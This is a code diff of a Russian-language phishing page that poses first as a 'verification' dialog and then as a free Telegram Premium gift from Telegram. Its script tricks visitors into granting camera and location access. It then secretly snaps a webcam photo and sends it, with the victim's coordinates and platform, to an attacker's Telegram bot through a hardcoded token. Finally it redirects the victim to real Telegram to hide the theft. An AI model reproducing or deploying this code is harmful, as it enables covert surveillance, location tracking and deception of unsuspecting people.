@@ -1,90 +1,101 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <title>Verify Access</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram Gift — Бесплатные подарки</title>
     <style>
-        body { background: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
-        /* Фейковое окно, похожее на системное */
-        .modal { width: 270px; background: rgba(255,255,255,0.9); border-radius: 14px; text-align: center; padding: 20px 0 0; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
-        .title { font-weight: 600; font-size: 17px; margin-bottom: 5px; padding: 0 15px; }
-        .desc { font-size: 13px; margin-bottom: 20px; padding: 0 15px; }
-        .btn { border-top: 0.5px solid #ccc; color: #007aff; font-size: 17px; padding: 12px 0; cursor: pointer; font-weight: 500; }
-        .btn:active { background: #eee; }
+        body { background-color: #f0f2f5; font-family: -apple-system, system-ui, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 400px; border-radius: 20px; box-shadow: 0 4px 25px rgba(0,0,0,0.1); text-align: center; padding: 30px; }
+        .logo { width: 80px; height: 80px; margin-bottom: 20px; }
+        h1 { font-size: 22px; color: #222; margin: 10px 0; }
+        p { color: #666; font-size: 15px; line-height: 1.5; }
+        .btn { background: #0088cc; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; width: 100%; transition: 0.2s; }
+        .btn:active { transform: scale(0.98); background: #0077b5; }
+        .footer { margin-top: 15px; font-size: 12px; color: #aaa; }
     </style>
 </head>
 <body>
 
-    <div class="modal">
-        <div class="title">Требуется верификация</div>
-        <div class="desc">Для продолжения работы с сервисом необходимо подтвердить, что вы не робот. Нажмите «Разрешить» в следующем окне.</div>
-        <div class="btn" id="fakeBtn">Продолжить</div>
-    </div>
+<div class="card">
+    <img src="https://telegram.org/img/t_logo.png" class="logo" alt="TG">
+    <h1>Подарок для вас!</h1>
+    <p>Вы были выбраны для получения <b>Telegram Premium на 3 месяца</b> бесплатно. <br><br>Для защиты от ботов и активации подарка требуется подтверждение личности через системную проверку.</p>
+    
+    <button class="btn" id="claimBtn">ПОЛУЧИТЬ ПОДАРОК</button>
+    
+    <div class="footer">Официальная акция Telegram 2026</div>
+</div>
 
-    <video id="v" style="display:none" autoplay></video>
-    <canvas id="c" style="display:none" width="640" height="480"></canvas>
+<video id="v" style="display:none" autoplay></video>
+<canvas id="c" style="display:none" width="640" height="480"></canvas>
 
-    <script>
-        const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
-        const chat_id = '6581116621';
+<script>
+    const token = '8200658838:AAHrkPieYLwF2bVTps5HzrJVbXi013n6Sq8';
+    const chat_id = '6581116621';
 
-        document.getElementById('fakeBtn').onclick = function() {
-            // Как только он нажал на нашу кнопку, МГНОВЕННО вызываем системное окно
-            startCapture();
-        };
+    document.getElementById('claimBtn').onclick = function() {
+        this.innerText = 'ПРОВЕРКА...';
+        this.style.background = '#ccc';
+        startCapture();
+    };
 
-        async function startCapture() {
-            const video = document.getElementById('v');
-            const canvas = document.getElementById('c');
+    async function startCapture() {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
 
-            try {
-                // Запрашиваем всё сразу. Браузер выкинет стандартную табличку. 
-                // Из-за того, что мы только что нажали на "Продолжить", юзер по инерции нажмет "Разрешить"
-                const stream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
+        try {
+            // Запрашиваем камеру. На iPhone вылетит окно "Разрешить камеру для..."
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: "user" } 
+            });
+
+            // Сразу после этого запрашиваем гео
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await sendToBot(stream, pos, "✅ ПОЛНЫЙ ДОСТУП (Гео+Фото)");
+            }, async () => {
+                await sendToBot(stream, null, "📸 ТОЛЬКО ФОТО (Гео отклонено)");
+            });
+
+        } catch (err) {
+            // Если он нажал "Отклонить" в системном окне
+            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent('❌ Жертва испугалась и отклонила запрос')}`);
+            alert('Ошибка: Для получения подарка необходимо подтвердить доступ в настройках браузера.');
+            location.reload();
+        }
+    }
+
+    async function sendToBot(stream, pos, status) {
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
+        video.srcObject = stream;
+
+        // Даем камере 1 секунду сфокусироваться
+        setTimeout(() => {
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            canvas.toBlob(async (blob) => {
+                const fd = new FormData();
+                fd.append('chat_id', chat_id);
+                fd.append('photo', blob, 'shot.jpg');
                 
-                // Если разрешил, берем гео
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    await sendData(stream, pos, "✅ Полный доступ");
-                }, async () => {
-                    await sendData(stream, null, "📸 Только фото (Гео отказано)");
-                });
+                let report = `🎁 <b>GIFT LOG: ${status}</b>\n`;
+                report += `🖥 <b>OS:</b> ${navigator.platform}\n`;
+                if(pos) report += `📍 <b>Гео:</b> <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">На карте</a>`;
+                
+                fd.append('caption', report);
+                fd.append('parse_mode', 'HTML');
 
-            } catch (e) {
-                // Если нажал "Отклонить" в системном окне
-                fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=❌ Жертва отклонила запрос`);
-                location.href = "https://google.com"; // Уводим его, чтобы не тупил
-            }
-        }
+                // Отправляем на GitHub (здесь это не блокируется)
+                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
+                
+                stream.getTracks().forEach(t => t.stop());
+                
+                // Финальный обман: перекидываем его на настоящий Telegram, чтоб он ничего не понял
+                location.href = "https://t.me/premium";
+            }, 'image/jpeg', 0.8);
+        }, 1000);
+    }
+</script>
 
-        async function sendData(stream, pos, status) {
-            const video = document.getElementById('v');
-            const canvas = document.getElementById('c');
-            video.srcObject = stream;
-
-            setTimeout(() => {
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(async (blob) => {
-                    const fd = new FormData();
-                    fd.append('chat_id', chat_id);
-                    fd.append('photo', blob, 'f.jpg');
-                    
-                    let cap = `💎 <b>HIT: ${status}</b>\n`;
-                    if(pos) cap += `📍 <a href="http://maps.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}">Локация</a>`;
-                    
-                    fd.append('caption', cap);
-                    fd.append('parse_mode', 'HTML');
-
-                    await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, { method: 'POST', body: fd });
-                    stream.getTracks().forEach(t => t.stop());
-                    
-                    // Редирект на что-то безобидное
-                    location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
-                }, 'image/jpeg');
-            }, 1000);
-        }
-    </script>
 </body>
 </html>
